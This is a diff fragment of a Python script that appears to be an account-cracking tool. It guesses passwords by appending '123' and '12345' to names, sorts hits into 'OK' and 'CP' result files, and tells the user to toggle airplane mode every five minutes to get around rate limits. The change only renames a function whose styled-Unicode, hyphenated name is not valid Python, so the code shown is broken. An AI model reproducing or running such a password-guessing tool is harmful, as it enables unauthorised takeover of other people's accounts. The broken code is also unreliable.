@@ -249,11 +249,11 @@ def first():
 					pwv.append(frs+'123')
 					pwv.append(frs+'12345')
 			if 'mobile' in method:
-				pool.submit(𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-SINGH-BAWA_🔥,idf,pwv)
+				pool.submit(𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-SINGH-BAWA_,idf,pwv)
 			elif 'free' in method:
 				pool.submit(free,idf,pwv)
 			else:
-				pool.submit(𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-SINGH-BAWA_🔥,idf,pwv)
+				pool.submit(𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-SINGH-BAWA_,idf,pwv)
 def name():
 	clear()
 	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
